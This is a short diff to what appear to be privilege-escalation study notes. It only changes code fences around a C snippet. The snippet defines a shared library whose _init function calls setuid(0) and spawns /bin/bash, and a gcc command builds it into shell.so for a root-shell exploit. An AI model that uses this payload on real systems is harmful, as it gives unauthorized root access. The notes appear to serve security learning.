@@ -9,7 +9,7 @@ Exploitation
 create a file called shell.c
 with code
 
-" 
+```
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -20,8 +20,7 @@ void _init() {
     setuid(0);
     system("/bin/bash");
 }
-
-
+```
 compile it the command 
 `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 this will generate a .so file -> shell.so (in our case )
